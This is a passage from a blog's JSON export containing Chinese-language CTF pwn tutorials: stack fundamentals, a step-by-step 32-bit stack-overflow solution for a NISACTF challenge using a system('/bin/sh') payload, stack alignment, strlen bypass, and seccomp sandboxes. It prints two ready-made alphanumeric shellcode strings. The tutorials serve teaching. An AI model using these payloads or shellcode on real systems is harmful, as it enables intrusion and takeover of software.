我们发现payload的实际长度已经超过了可以读入的字节数 不妨从为什么system函数地址和参数要隔一个垃圾数据的原理来入手 我们这样编写payload的目的是调用system(‘&#x2F;bin&#x2F;sh’) 接下来用图像演示payload输入后的栈状况，利于理解 这里注意箭头指向，从下到上为由高地址向低地址，所以要注意buf是我们可以用来填充栈的变量 ret addr是我们要用来自由跳转的返回地址 所以我们构造的payload的cyclic（32）就会覆盖buf和ebp的空间 ret addr相当于ret system_addr 此时，由于system自己的汇编代码，他被弹出到eip后，会在原来栈的位置留下caller’s ebp 如下图 根据调用协议，system会去寻找低于他的ebp的两个字长处的数据作为他的参数，所以binsh_addr处的字符串&#x2F;bin&#x2F;sh就成为了system的参数 而体现给我们的就是，system_addr和参数间需要隔着一个垃圾数据 但是为什么调用call system就不需要中间这个垃圾数据呢？ 我们对于call指令进行详解一下 call指令： 第一步：先将call指令的下一条指令的CS和IP入栈（当然如果是段间转移就要将CS和IP入栈，如果是段内转移就只要将IP入栈） 第二步：就是操作与call对应的jmp指令 所有的call指令都是可以用上面的两步来确定的，这是个通用的法则。 所以call system后是不会跳转到下一个地址，因为他没有ret 所以函数地址和参数地址之间并不需要一个垃圾数据作为返回地址 这样就节省了一个垃圾数据的字长 栈对齐首先我们得知道为什么要进行栈对齐，以及栈对齐是个什么原理 栈对齐旨在尽可能在少的内存访问周期内读取数据(听不懂没关系，记结论也是一种美德) 即栈顶指针必须是16字节的整数倍 所以我们通常用ROPgaget来获取ret的地址 借助ret来进行栈对齐 ret怎么进行栈对齐？ ps:以下为本人推论，可信度不高 我们知道，ret的作用是弹出栈顶的一个字长到ip寄存器中 对于64位操作系统，一个字长就是8字节 如果此时栈顶指针末尾数字为8(即差一个字长，8字节才能为16字节整数倍) 这时候我们在返回地址处(这里不好理解，不过经过我自己的实验，在栈溢出中，不能放在垃圾数据前或中，不能放在栈顶，不能破坏payload原有结构，比如payload&#x3D;cyclic(xx)+p64(rid_addr)+p64(data_addr)中，如果ret放在rid_addr和data_addr就会破坏其原有的向rdi中传入参数的目的) 总结一下，如果有时候exp明明都对了，但就是pwn不成功，有可能是栈没有对齐导致的，可以gdb看一下栈顶地址，或者直接找对位置放个ret_addr python3中的byte型和str型首先我们要知道为什么要有byte型 在计算机发展初期，由于英文只有26个字母，相对比较容易做编译工作 所以早期的字符编码规范时ascii码 但是计算机发展普及后，多个国家的文字如何编译就成了问题 于是UTF-8编码应运而生，它规定英文字母系列用1个字节表示，汉字用3个字节表示等等 它兼容ASCII，可以解码早期的文档。 以汉字中文作为例子 byte：b’\\xe4\\xb8\\xad\\xe6\\x96\\x87’ str：**’中文’** byte型的作用是用来传输和存储数据，即str型的中文在传输时将encoude成byte型，需要使用时再decode成str型 那既然str型的数据在传输和存储的过程中，python会自动将我们的数据编码解码 那byte型的数据用意何在？ 使用byte型实质上是告诉Python，不需要它帮你自动地完成编码和解码的工作，而是用户自己手动进行，并指定编码格式 并且由于python明确规范了byte型和str型，这二者就不能混用 python中单双引号区别“”和’’都是为了用来定义一个字符串类型的数据 二者其实本质上没有区别 当我们需要定义一个需要引号的字符串时，这二者就可以用来这样表示： “我需要一个’引号’来表示我的字符串” strlen绕过我们首先得了解，一段字符串是以’\\0’来标记结尾的 即当strlen识别到\\0时就会停止判断当前字符串的长度，那我们要绕过strlen就可以通过构造字符串时将其开头以\\0填充 可见字符串shellcode有些题目虽然也是考查shellcode 但是其会对输入的字节进行if判定 需要有一个范围才能输入成功 所以这时候就用到了可见字符串shellcode 12345# 64位 纯ascii字符shellcodePh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t————————————————# 32位 纯ascii字符shellcodePYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA 沙盒sandbox 在ctf比赛中，pwn题中的沙盒一般都会限制execve的系统调用，这样一来one_gadget和system调用都不好使，只能采取open&#x2F;read&#x2F;write的组合方式来读取flag 标志性函数是prctl和seccomp 查询二进制文件限制的函数指令 1seccomp-tools dump ./filename","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"栈溢出","slug":"32位栈溢出","date":"2022-09-15T04:26:15.000Z","updated":"2022-10-06T13:37:24.492Z","comments":true,"path":"2022/09/15/32位栈溢出/","link":"","permalink":"http://example.com/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"继上文点到栈溢出的基础原理，本文来详细演示如何完成一题栈溢出 checksec的使用及保护机制了解操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险 在我们开始尝试做题之前，我们先得知道这道题开启了哪些安全机制，我们又该如何绕过其安全机制 这里便使用到了checksec工具 Arch：程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？ RELRD:Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。 （看不懂没有关系 ，后续学习将会接触到plt和got表的相关知识） Stack：由上文可知，在我们进行栈溢出的时候，只需覆盖ret addr就能达到操控程序执行流的目的，但此项保护机制，在栈中会随机生成一段数据，在函数返回的时候，会检验这段数据是否正确，如果不正确，程序就会崩溃退出，这段数据在liunx中被称为canary NX:NX enabled如果这个保护开启就是意味着我们对栈中数据没有执行权限，我们无法在栈中自由更写，但是通过ROP构造执行流的办法可以绕过这个保护(同样将在接下来的学习中讲到) PIE:pie保护机制和ASLR相类似，我们已经知道每个数据在计算机中都有自己相应的地址，通过寻址计算机可以成功调用他们，ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关, 即程序中的地址在每次运行时都会发生变化，我们将在后续的学习中接触到pie ida使用和漏洞分析通过checksec我们可以得知此题为32位，我们将其拖进32位ida查看 左边的function name是此二进制文件中的函数列表，通常主函数的名称是main 右侧便为此文件的汇编代码 我们可以按下f5进行ida反编译，将其转化为c语言代码的形式 main函数的组成相当简单，只有一个子函数shell，我们点进去看看 第三行，定义了一个buf变量，那么后面的esp+0h和ebp-48h是什么意思？ 我们进行栈溢出的目的是为了覆盖ret addr 从而将程序的返回地址修改成我们需要的，此时read读入的变量buf的位置就是位于ebp再往上0x48处的栈顶 所以我们可以得知，我们赋值的变量buf离ret addr差了0x48+0x4个字节 这里为什么还要加4？如果是64位呢，还是加4吗 我们之前说过了，一个字长对应的字节是根据位数的不同来决定的 此时需要在0x48的数据上再加上0x4是因为我们离ret addr还隔着一个ebp，一个字长的距离 接下来我们看回程序，输出语句”welcome to NISACTF” 在return处调用了函数read，读入了0x60字长的数据，而此时我们需要溢出的数据长度为0x48+0x4+0x4(我们用来覆盖ret addr的数据) 这里就出现了栈溢出漏洞，但是此时我们还需要system(&#x2F;bin&#x2F;sh)的地址，以达到获取flag的目的 我们可以依法炮制，翻阅其他函数的内容，我们发现这题的作者并没有直接给我们 那么system(&#x2F;bin&#x2F;sh)就需要我们自己构造 我们接着使用shift+f12来打开string窗口，一键找出所有的字符串 我们惊喜的发现，在data段(不清楚什么是data段的，请仔细观看谢师傅的视频，为虚拟内存映射的相关知识)中存在字符串&#x2F;bin&#x2F;sh 拥有这段字符串意味着什么？ 我们知道，函数的执行一般需要参数 例如system(&#x2F;bin&#x2F;sh)中的&#x2F;bin&#x2F;sh便是system的参数 所以，我们接下来的任务就是去找到system函数的地址，并且把&#x2F;bin&#x2F;sh这段字符串作为参数，就可以实现system(&#x2F;bin&#x2F;sh) plt表和got表这里举一个简单的例子 某公司开发了一款软件，实现的代码调用了大量的函数，这些函数的每次实现都需要在文件(这个软件)中对应的前置来实现他 这样子就增大了文件的体积 但是如果将实现这些函数的前置在程序运行时载入到内存中呢？ 这样每一款软件都无需额外的内存占用，并且用户也能成功运行 所以这里就出现了plt表和got表的概念 当我们需要调用system函数时，他会去自动寻找system的plt表 其plt表中存储了system函数的got表的地址 其就是system在libc(libc同样在谢师傅的视频中有所介绍)中的地址 但是我们在第一次调用system函数的时候，其got表中的地址并不知道system在libc中的哪里 于是第一次调用无果后，system的plt表便会收到消息，去给got表找到system在libc的位置 经过原定好的代码实现，plt表便查找到了libc中system的地址，并将其填充给了got表 接下来plt表再去got表中，他就得知了地址，就可以成功调用system函数 所以我们可以将整个流程用下图来展示 而在之前程序已经调用了system函数进行echo 字符串，所以我们此时再去system的plt表中就能获取到system在libc中的地址 这里你可能会无法理解，但是在初期的学习我们只需要记住，plt表是调用该函数，got表中存的地址是为了获得真实地址 发现漏洞后，接下来就要进行shellcode的编写，开始攻击 以下shellcode的编写需要python基础，这里同样不做解释，请自行学习） 但我个人是没有进行任何额外的python学习(截止到我学习到堆)，不知道这条路是否合理化，请根据自己在学习中遇到的情况自行斟酌 shellcode的编写 –第二行建立与靶场的联系(概念不做解释，自行查找)的联系，名称不一定要是io，“ ”中为ip地址，逗号后为端口) –第三行为后续我们获得system的plt表内容的前置条件，括号中为”.&#x2F;文件名” –第四行，接收程序的输出内容，简单的是xxx.recv() [xxx为你先前命名的名称，比如我的io] io.recv()将会接收一行的数据，以\\n为结束判定 而io.recvuntil(“ “)将会接收到” “内的数据才停止，并且包括“ ”内的数据 如果不想接收“ ”内的数据，可以这样编写io.recvuntil(“hello”,drop &#x3D; True) –第五行，为变量system_addr赋值 赋值的内容为system的plt表中的内容 –第六行，编写payload，cyclic创建括号内自定义字长的垃圾数据用来填充ret addr前的内容 随后我们要注意p32()这个语法，为什么要使用它？ 首先，send系列只能传参字符串，recv接收回来的也只能是字符串，这是因为网络传输的规定! 所以，对于地址值0x1234，就只有变成字符串传出去 你应该也能猜到为什么是p32，64位程序使用的便是p64 接下来我们可以理解p32(0x804a024)就是字符串&#x2F;bin&#x2F;sh的地址，那么中间的0xabcdabc又是什么？ 这里先粗略进行一个介绍，具体的介绍将在后续进行一个专门的文章(可见其中的复杂) 我们只需要知道，正常的调用system（即非使用call system的汇编代码地址），要想成功为其传参，函数和参数之间要有一个垃圾数据 所以他的形式可以不为abcdabc可以是任何符合格式的地址 –第七行，发送我们构造好的payload，进行栈溢出攻击 最后，io.interactive()来与终端交互，如果pwn成功，那么我们就可以使用ls来查看当前目录下有哪些文件 我们利用python3（需要你的虚拟机中安装好了python3）发送这段exp试试 可以看到我们输入ls后，成功列出了目录的文件，我们发现了一个名为flag的文件，那么这就是我们的最后答案了 cat flag(liunx使用命令请自行百度) 答案到手！ 在阅读完本文后，相信你对栈溢出的解法已经有了一个大致的理解，接下来请自行前往ctfshow或者其他平台独立解题","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"栈的基础知识","slug":"栈的基础知识","date":"2022-09-13T12:20:05.000Z","updated":"2022-09-20T08:17:39.338Z","comments":true,"path":"2022/09/13/栈的基础知识/","link":"","permalink":"http://example.com/2022/09/13/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"什么是栈？在了解栈相关的知识前，我们需要一些汇编代码的基础 可以将谢师傅的视频作为阅读本文的前提，接下来所出现的名词将不再作解释（19分51秒到35分32秒，以及56分31秒到1时4分为栈部分内容） [pwn入门]0基础学习程序与计算机-2_哔哩哔哩_bilibili 无妨从栈在语文中的定义理解—&gt;存储货物或供旅客住宿的地方,可引申为仓库、中转站。 在计算机系统中，栈则是一个具有以上属性的动态内存区域。程序可以将数据压入栈中，也可以将数据从栈顶弹出。在i386机器中，栈顶由称为esp的寄存器进行定位。入栈的操作使得栈顶的地址减小，出栈的操作使得栈顶的地址增大（栈是从高地址向低地址增长）。 栈分为顺序栈，共享栈，链式栈 这里只介绍顺序栈 用一个简单的例子来帮助我们理解栈的作用： 当我们在打开网页A时，我们关闭网页A，进入网页B，关闭网页B，进入网页C 这个时候如果我们想要返回网页A，我们有两种办法1.重新打开网页A 2.使用回退返回网页A 在使用第二种方法的过程中，我们会发现需要先返回网页B，浏览器 “回退” 功能的实现，底层使用的就是栈存储结构 当你关闭网页A后，A就会入栈，我们可以将其理解为上图的a1，关闭网页B后，a2入栈 所以当我们使用回退的时候，位于低地址的a2就会先于a1出栈，给予用户的体现就是我们先返回了网页B再返回网页A 有点难以理解？A是如何入栈？入栈后，栈的结构肯定不会只是简简单单的a1，a2 这里引入内存地址这一概念(这里介绍的是物理内存地址) 什么是内存地址？ 内存地址是一个编号，代表内存空间，内存地址是一种介于硬件软件等不同层级的数据概念，用来访问电脑内存中的数据 基于操作系统位数的不同，内存地址的表现形式也有所不同 比如32位下的地址可以为0x00000001 64位下的地址可以为0x0000000000000001 这里的地址表现形式不同于我们常用的10进制 而是16进制 又出现了一个新的知识点，16进制数，似乎在ctf中很常见？ 在高中，我们学过二进制的知识，16进制也是同理 16进制个人认为网上的一些讲解方式虽然详细，对于进制有着全面的帮助，但本文出于方便理解，决定只是对16进制进行引导 0x1-0x9对应着10进制中的1-9，这个我们可以很快速的理解，那么轮到十进制中的10呢？是0x10？显然不是 数字不够用来表示了怎么办？我们还有字母可以选择 0xa-0xF对应着十进制中的10-15 (这里可以注意到前后的大小写并不一致，是因为16进制的书写对于大小写并没有形式上的要求) 这样说是否就大体了解清楚了16进制？这里可以再思考一个小问题，那当我们要表示十进制的16怎么办呢？ 逢16进1，16就表示为了0x10，接下来的17，18 我们就可以表示为0x11和0x12 让我们把思绪收回到内存地址 内存地址(物理内存地址)程序和数据平常存储在硬盘等存储器上，不管你开机或关机了，它们都是存在的，不会丢失。硬盘可以存储的东西很多，但其传输数据的速度较慢。所以需要运行程序或打开数据时，这些数据必须从硬盘等存储器上先传到另一种容量小但速度快得多的存储器，之后才送入CPU进行执行处理。这中间的存储器就是内存。 无论何种存储器，软盘、硬盘、光盘或者内存，都有地址。因为它们要存储数据，所以就必须按一定的单位的数据分配一个地址。有了地址，程序才能找到这些数据。这很好理解，想想你们家为什么要有门牌号即可。 内存地址将一切数据和命令进行了数字化，他知道其各自对应的位于内存中的哪个位置，这个位置的表现形式就是内存地址 所以这里可以做一个总结，内存地址并不是数据本身，而是类似于指向标的东西指引计算机寻址找到数据 例如电脑使用中的快捷方式，他可以出现在任何目录却都能打开你所需要的程序，其原理就是计算机基于内存地址的寻址 现在我们已经大致了解了地址，但是我们仍然有一个疑问，为什么随着操作系统位数的不同，地址的表现形式也不同呢？ 32位64位操作系统在查阅资料时，我发现我对于这一方面的知识非常薄弱，所以操作系统位数的内容篇幅将远超其他部分 在挑选电脑时，我们会困惑于繁多的cpu类型，诸如常见的拯救者y9000p所搭载的i7-12700h 这里以inter酷睿处理器的命名规则举例(amd的可以自行了解)，我们会发现有i3，i5，i7，i9四种 数字越多，处理器性能越好？这是一个常见的误区 在同代产品中，以核心数和线程数作为区分标准 核心数和线程数一开始，cpu只有单核心，所以只能同时进行单进程&#x2F;线程任务 类似于人类的团队，只有一个人的情况下，只能同时进行一项任务 随着计算机的发展，单核心的cpu性能出现不足，cpu产商开始在单个物理cpu上增加核心 这时候我们的团队就迎来的第二个人手，他可以在第一个执行任务时，去独立完成另外的任务 同时多线程技术本质也是一样，是为了提高单个cpu核心同一时刻能够执行的多线程数的技术 类似于团队中的一名队员同时处理多项任务 cpu位数你可能会说，上述的核心数和线程数和操作系统位数有什么联系？没有哦，只是一个扩展，做为导入我们cpu位数的前置知识 CPU位数指的是一个时钟周期内处理器同时寄存和处理的二进制位数，如何理解这句话? 我们先要知道所有的数字信息在计算机中都是用数字代码表示，为了电路处理方便，就用二进制表示，电路用高电平、低电平表示2个数码“1”和“0”，计算机中所有的信息从输入，存储，处理到输出都是用基于二进制的电信号表示 对于CPU位数，他等同于CPU中寄存器的位数 &#x3D; CPU一次并行处理的数据宽度。CPU位数越多，则寻址位数越多，处理能力就越强。 操作系统位数操作系统位数的概念是基于cpu位数的 32位的cpu只能安装32位的操作系统 而64位的cpu既可以安装32位的操作系统也能安装64位的操作系统 字长，字节，比特回到刚才的话题，为什么操作系统位数会影响到地址的表现形式？我们似乎仍然没有搞懂这个问题 我们还需要引入字长，字节，比特的概念 在32位操作系统的环境下，一个字长所对应的是4个字节 在64位操作系统的环境下，一个字长所对应的是8个字节 而一个字节对应8比特，这无关于操作系统位数 我们拿刚才32位操作系统下的地址举例 ：0x11223344(为了方便理解，我将相邻的两个用相同的数字表示) 11，22，33，44各自所对应的就是一个字节，因为32位操作系统下的一个字长所对应的是4字节，所以长度就为0x00000000 栈的具体结构前文我们以后退作为例子，但仍然有一个疑问，栈的具体结构是怎么样的？ 我们简单举一个函数跳转的例子 函数A运行过程中跳转到了函数B(A和B的关系比如上一篇文章里面的main函数和fun函数，fun函数是main函数到的子函数) 此时就会将函数A的栈顶地址放在函数B的栈底，这样当函数B执行完了以后，esp就可以指向ret addr使得eip返回到函数A的栈顶 （esp，eip如果不清楚概念，请折返回文章头观看谢师傅的视频） 不知道了解到这里，你是否有一个大胆的想法？我们已经知道，我们pwn的最后目的是写入一段shellcode，以便我们取得flag 而通常这个shellcode是要调用system(&#x2F;bin&#x2F;sh)这一函数 已经知道了函数B会返回到ret addr所指向的地址，是否可以修改返回地址？使执行流跳转到system所在的地址 没错，这就是我们接下来栈溢出的基本原理！","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"pwn入门指南","slug":"pwn入门指南","date":"2022-09-13T06:11:35.000Z","updated":"2022-09-16T11:02:32.642Z","comments":true,"path":"2022/09/13/pwn入门指南/","link":"","permalink":"http://example.com/2022/09/13/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/","excerpt":"","text":"本文旨在简要概括ctf中pwn方向的主要学习知识，以供不知道学习什么方向或者不知道如何学习pwn的人参考 什么是pwn就我个人在刚决定入门这个方向的时候，我是希望有人给予我一个清楚的定义，即这个方向是如何完成ctf中的题目。所以最为关键的引导，我决定通过一个简单的pwn题来向你体现pwn是一个怎样的方向，并且就我个人而言，我是不希望将pwn的教程写的又臭又长，接下来的一系列教程将以尽量幽默形象的语言风格叙述，那让我们以fstar 21届的校赛pwn题第一题作为例题开讲 2022 NISACTF pwn-ReorPwn? 通常pwn题的附件是一个二进制文件，图中所用到的工具ida可以将二进制文件反编译成c语言代码 到了这里，pwn手的两个学习方向你应该也清楚了—&gt;ida的使用和c语言的代码审计 依我个人的学习经历，我觉得c语言学习到指针和结构体的进度，就足够你完成栈(pwn的一种题型)的大部分知识 ida的使用也不需要刻意去百度学习，你将在栈部分的学习中大致掌握使用技巧 接着往下说，这里我假设你已经可以看懂本题的c语言表示，那么我们继续分析 3~5行的setvbuf用意于清空缓存区(相关概念后续将进行补充) 第六行 put输出了一行话，在pwn题中，题目描述，题目名称，又或者是程序中的语句，都可能是解题的关键提示 evcexe ot tnaw uoy tahw em lleT 第一眼 是不是觉得这不是一个正常的英文句子？ 不凡把他倒转过来试试 Tell me what you want to execve 我们记住这段话，接着往下看 第七行调用了gets函数，将用户输入的值赋给了变量a 第八行出现了一个fun函数？似乎不是一个很常见的函数，有可能是出题人自己定义的一个函数，我们可以双击点进去查看 将用户输入的a进行倒置 比如你输入了sh 此时return的值便为hs PS：这里介绍一个实用的小技巧，很多时候我们看不懂这段代码是干什么的怎么办，可以自己运行一下程序 啊，你问如何运行这个程序， 你似乎不能双击打开他？ 这里就又牵扯到了windows和liunx文件类型(自行百度) 总之，我们需要一台搭载linux操作系统的电脑，但面临的问题是，或许没有多余的资金来浪费又因为两台电脑间传输文件的困难 所以我们这里引入一个新的概念，虚拟机 什么是虚拟机？我们先把这个疑问抛到一边，后续的文章我们再来介绍，本文的目的旨在笼统介绍pwn题 将文件运行之后 我们需要给变量a赋值，这里随便写一个hello 欸 这里好像报错了 仔细看 sh: 1：olleh：not found olleh？ 这不是hello倒过来吗 倒？前面的语句你是否还记得 倒转？ 灵感在你脑中乍现了吧 我们虽然看不懂fun函数中的for 但是可以通过尝试的办法来明白他是起到了一个什么作用 所以 我们输入的值 在被赋值给a后会被倒转 再执行system(a) 又一个疑问了 system(a)是什么？ 百度你可以获得system函数权威严谨的定义 这里我简单说一下 作为前期栈学习 你只需要了解 你的一切行为 都是为了获得目标终端的控制权限 从而获取flag 这种方法通常可以是调用system(&#x2F;bin&#x2F;sh)这串代码来实现的 所以 本题的思路已经很明显了 要想system函数中的值为&#x2F;bin&#x2F;sh的话 我们赋值的a 就要为hs&#x2F;nib&#x2F; 可以看到 当我们输入hs&#x2F;nib&#x2F;后 我们再输入ls 我们就列出了当前目录下的文件列表，这意味着我们成功调用了system(&#x2F;bin&#x2F;sh) 完成了一次pwn 到了这里 相信你已经对于pwn是什么有了一个清楚的认知 如果你对此感有兴趣 欢迎主攻pwn方向 成为一名pwn爷 本文结束","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]}],"categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"},{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"},{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"},{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"},{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"},{"name":"reverse","slug":"reverse","permalink":"http://example.com/categories/reverse/"},{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"密码","slug":"密码","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81/"}],"tags":[]}